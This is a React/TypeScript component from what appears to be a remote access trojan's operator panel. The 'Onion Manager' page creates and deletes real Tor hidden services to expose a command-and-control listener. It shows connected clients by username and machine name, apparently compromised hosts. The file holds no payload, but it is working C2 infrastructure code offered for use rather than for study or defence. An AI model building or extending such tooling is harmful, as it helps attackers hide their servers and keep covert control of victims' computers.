import { useContext, useEffect, useState } from "react";
import {
  IconCircleFilled,
  IconCopy,
  IconPlus,
  IconRefresh,
  IconTrash,
  IconUsers,
  IconWorld,
  IconLoader2,
} from "@tabler/icons-react";
import toast from "react-hot-toast";
import { listen } from "@tauri-apps/api/event";
import { RATContext } from "../rat/RATContext";
import { initTorCmd, createOnionCmd, deleteOnionCmd } from "../rat/RATCommands";
import { OnionServiceInfo, RATClient } from "../../types";

// ─── helpers ──────────────────────────────────────────────────────────────────

const toastStyle = "!bg-white !text-black !rounded-2xl !border-accentx";

function copyToClipboard(text: string) {
  navigator.clipboard.writeText(text);
  toast.success("Copied!", { className: toastStyle });
}

function clientsForOnion(
  clients: RATClient[],
  address: string
): RATClient[] {
  // Clients built for this onion have addr ending in the onion host fragment
  const onionHost = address.endsWith(".onion")
    ? address
    : `${address}.onion`;
  return clients.filter(
    (c) =>
      c.data.addr.includes(onionHost.replace(".onion", "")) ||
      c.data.addr.includes(address)
  );
}

// ─── Skeleton card ────────────────────────────────────────────────────────────

const SkeletonCard = () => (
  <div className="animate-pulse rounded-2xl border border-accentx bg-secondarybg p-5 flex flex-col gap-3">
    <div className="h-4 w-2/3 rounded bg-accentx/30" />
    <div className="h-3 w-full rounded bg-accentx/20" />
    <div className="h-3 w-1/3 rounded bg-accentx/20" />
  </div>
);

// ─── Service card ─────────────────────────────────────────────────────────────

interface ServiceCardProps {
  info: OnionServiceInfo;
  connectedClients: RATClient[];
  onDelete: (nickname: string) => void;
  deleting: boolean;
  status?: string;
}

const ServiceCard = ({
  info,
  connectedClients,
  onDelete,
  deleting,
  status = "Unknown",
}: ServiceCardProps) => {
  const fullAddress = info.onion_address.endsWith(".onion")
    ? info.onion_address
    : `${info.onion_address}.onion`;

  return (
    <div className="group rounded-2xl border border-accentx bg-secondarybg p-5 flex flex-col gap-4 transition hover:border-white/20">
      {/* Header */}
      <div className="flex items-center justify-between gap-2">
        <div className="flex items-center gap-2 min-w-0" title={`Status: ${status}`}>
          <IconCircleFilled
            size={10}
            className={`shrink-0 ${
              status === "Running"
                ? "text-green-400"
                : status === "Bootstrapping"
                ? "text-yellow-400 animate-pulse"
                : status === "Shutdown"
                ? "text-gray-500"
                : "text-red-400"
            }`}
          />
          <span className="font-semibold text-white truncate">{info.nickname}</span>
        </div>
        <div className="flex items-center gap-1.5 shrink-0">
          <span className="text-xs text-accenttext bg-primarybg border border-accentx px-2 py-0.5 rounded-full">
            port {info.port}
          </span>
          <button
            onClick={() => onDelete(info.nickname)}
            disabled={deleting}
            className="p-1.5 rounded-lg text-accenttext hover:text-red-400 hover:bg-red-400/10 transition disabled:opacity-40 cursor-pointer"
            title="Delete service"
          >
            {deleting ? (
              <IconLoader2 size={16} className="animate-spin" />
            ) : (
              <IconTrash size={16} />
            )}
          </button>
        </div>
      </div>

      {/* Address row */}
      <div className="flex items-center gap-2 bg-primarybg rounded-xl px-3 py-2 border border-accentx/50">
        <IconWorld size={16} className="text-purple-400 shrink-0" />
        <span className="text-xs text-accenttext font-mono truncate flex-1 select-text">
          {fullAddress}
        </span>
        <button
          onClick={() => copyToClipboard(fullAddress)}
          className="p-1 rounded hover:text-white text-accenttext transition cursor-pointer shrink-0"
          title="Copy address"
        >
          <IconCopy size={14} />
        </button>
      </div>

      {/* Connected clients */}
      <div className="flex items-center gap-2">
        <IconUsers size={14} className="text-accenttext shrink-0" />
        <span className="text-xs text-accenttext">
          {connectedClients.length === 0
            ? "No clients connected"
            : `${connectedClients.length} client${connectedClients.length > 1 ? "s" : ""} connected`}
        </span>
        {connectedClients.length > 0 && (
          <div className="flex gap-1 flex-wrap">
            {connectedClients.slice(0, 5).map((c) => (
              <span
                key={c.data.uuidv4}
                className="text-xs bg-green-500/10 text-green-400 border border-green-500/30 px-2 py-0.5 rounded-full"
              >
                {c.system.username}@{c.system.machine_name}
              </span>
            ))}
            {connectedClients.length > 5 && (
              <span className="text-xs text-accenttext">
                +{connectedClients.length - 5} more
              </span>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

// ─── Create modal ─────────────────────────────────────────────────────────────

interface CreateModalProps {
  onCreated: (info: OnionServiceInfo) => void;
  onClose: () => void;
}

const CreateModal = ({ onCreated, onClose }: CreateModalProps) => {
  const [nickname, setNickname] = useState("");
  const [port, setPort] = useState("1337");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleCreate = async () => {
    if (!nickname.trim()) {
      setError("Nickname is required");
      return;
    }
    if (!/^[a-zA-Z0-9-]+$/.test(nickname)) {
      setError("Only letters, numbers and dashes allowed");
      return;
    }
    const portNum = parseInt(port);
    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
      setError("Port must be 1–65535");
      return;
    }

    setError("");
    setLoading(true);
    try {
      const info = await createOnionCmd(nickname, portNum);
      onCreated(info);
      toast.success("Onion service created!", { className: toastStyle });
      onClose();
    } catch (e: any) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
      onClick={(e) => e.target === e.currentTarget && onClose()}
    >
      <div className="w-full max-w-md bg-secondarybg border border-accentx rounded-2xl p-6 flex flex-col gap-5 shadow-2xl">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-purple-500/10 border border-purple-500/30 rounded-xl">
            <IconWorld size={22} className="text-purple-400" />
          </div>
          <div>
            <h2 className="text-white font-semibold text-lg">New Onion Service</h2>
            <p className="text-xs text-accenttext">Creates a real Tor hidden service</p>
          </div>
        </div>

        <div className="flex flex-col gap-3">
          <div className="flex flex-col gap-1.5">
            <label className="text-xs text-accenttext">Nickname</label>
            <input
              type="text"
              className="bg-primarybg border border-accentx rounded-xl px-3 py-2 text-white text-sm focus:outline-none focus:border-white/40 transition"
              placeholder="my-c2-service"
              value={nickname}
              onChange={(e) => setNickname(e.target.value)}
              autoFocus
            />
          </div>
          <div className="flex flex-col gap-1.5">
            <label className="text-xs text-accenttext">Forward to local port</label>
            <input
              type="number"
              className="bg-primarybg border border-accentx rounded-xl px-3 py-2 text-white text-sm focus:outline-none focus:border-white/40 transition"
              placeholder="1337"
              value={port}
              onChange={(e) => setPort(e.target.value)}
            />
            <p className="text-xs text-accenttext">
              Tor traffic will be forwarded to <span className="text-white font-mono">127.0.0.1:{port}</span>
            </p>
          </div>
          {error && (
            <div className="text-xs text-red-400 bg-red-400/10 border border-red-400/30 rounded-xl px-3 py-2">
              {error}
            </div>
          )}
        </div>

        <div className="flex gap-2">
          <button
            onClick={onClose}
            className="flex-1 py-2 rounded-xl border border-accentx text-accenttext hover:text-white transition cursor-pointer"
          >
            Cancel
          </button>
          <button
            onClick={handleCreate}
            disabled={loading}
            className="flex-1 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition disabled:opacity-50 flex items-center justify-center gap-2 cursor-pointer"
          >
            {loading ? (
              <>
                <IconLoader2 size={16} className="animate-spin" />
                Bootstrapping…
              </>
            ) : (
              <>
                <IconPlus size={16} />
                Create
              </>
            )}
          </button>
        </div>
      </div>
    </div>
  );
};

// ─── Main page ────────────────────────────────────────────────────────────────

export const OnionManager = () => {
  const { clientList } = useContext(RATContext)!;
  const [services, setServices] = useState<OnionServiceInfo[]>([]);
  const [serviceStatuses, setServiceStatuses] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(true);
  const [showCreate, setShowCreate] = useState(false);
  const [deletingNick, setDeletingNick] = useState<string | null>(null);

  useEffect(() => {
    let unlisten: (() => void) | undefined;
    const setupListener = async () => {
      unlisten = await listen<{ nickname: string; status: string }>(
        "tor_service_status",
        (event) => {
          setServiceStatuses((prev) => ({
            ...prev,
            [event.payload.nickname]: event.payload.status,
          }));
        }
      );
    };
    setupListener();
    return () => {
      if (unlisten) unlisten();
    };
  }, []);

  const loadServices = async () => {
    setLoading(true);
    try {
      const list = await initTorCmd();
      setServices(list);
    } catch (e: any) {
      toast.error(String(e), { className: toastStyle });
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadServices();
  }, []);

  const handleDelete = async (nickname: string) => {
    if (!confirm(`Delete onion service "${nickname}"? This cannot be undone.`)) return;
    setDeletingNick(nickname);
    try {
      await deleteOnionCmd(nickname);
      setServices((prev) => prev.filter((s) => s.nickname !== nickname));
      toast.success(`Deleted "${nickname}"`, { className: toastStyle });
    } catch (e: any) {
      toast.error(String(e), { className: toastStyle });
    } finally {
      setDeletingNick(null);
    }
  };

  const handleCreated = (info: OnionServiceInfo) => {
    setServices((prev) => [...prev, info]);
  };

  const totalClients = services.reduce(
    (sum, s) => sum + clientsForOnion(clientList, s.onion_address).length,
    0
  );

  return (
    <div className="h-full bg-primarybg p-5 flex flex-col gap-5 overflow-auto">
      {showCreate && (
        <CreateModal
          onCreated={handleCreated}
          onClose={() => setShowCreate(false)}
        />
      )}

      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-purple-500/10 border border-purple-500/30 rounded-2xl">
            <IconWorld size={26} className="text-purple-400" />
          </div>
          <div>
            <h1 className="text-white font-bold text-xl">Onion Manager</h1>
            <p className="text-xs text-accenttext">Manage real Tor hidden services</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={loadServices}
            disabled={loading}
            className="flex items-center gap-1.5 px-3 py-2 rounded-xl border border-accentx text-accenttext hover:text-white transition cursor-pointer disabled:opacity-50"
          >
            <IconRefresh size={15} className={loading ? "animate-spin" : ""} />
            <span className="text-xs">Refresh</span>
          </button>
          <button
            onClick={() => setShowCreate(true)}
            className="flex items-center gap-1.5 px-4 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-sm font-semibold transition cursor-pointer"
          >
            <IconPlus size={16} />
            New Service
          </button>
        </div>
      </div>

      {/* Stats bar */}
      <div className="grid grid-cols-3 gap-3">
        {[
          {
            label: "Active Services",
            value: services.length,
            color: "text-purple-400",
          },
          {
            label: "Total Connected",
            value: totalClients,
            color: "text-green-400",
          },
          {
            label: "All Clients",
            value: clientList.length,
            color: "text-white",
          },
        ].map((stat) => (
          <div
            key={stat.label}
            className="bg-secondarybg border border-accentx rounded-2xl px-4 py-3 flex flex-col gap-1"
          >
            <span className={`text-2xl font-bold ${stat.color}`}>
              {stat.value}
            </span>
            <span className="text-xs text-accenttext">{stat.label}</span>
          </div>
        ))}
      </div>

      {/* Services grid */}
      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
          {[1, 2, 3].map((i) => (
            <SkeletonCard key={i} />
          ))}
        </div>
      ) : services.length === 0 ? (
        <div className="flex-1 flex flex-col items-center justify-center gap-4 text-center">
          <div className="p-5 bg-secondarybg border border-accentx rounded-3xl">
            <IconWorld size={48} className="text-accenttext" />
          </div>
          <div>
            <p className="text-white font-semibold text-lg">No onion services yet</p>
            <p className="text-accenttext text-sm mt-1">
              Create one to expose your C2 listener over Tor
            </p>
          </div>
          <button
            onClick={() => setShowCreate(true)}
            className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition cursor-pointer"
          >
            <IconPlus size={16} />
            Create First Service
          </button>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
          {services.map((svc) => (
            <ServiceCard
              key={svc.nickname}
              info={svc}
              connectedClients={clientsForOnion(clientList, svc.onion_address)}
              onDelete={handleDelete}
              deleting={deletingNick === svc.nickname}
              status={serviceStatuses[svc.nickname]}
            />
          ))}
        </div>
      )}
    </div>
  );
};
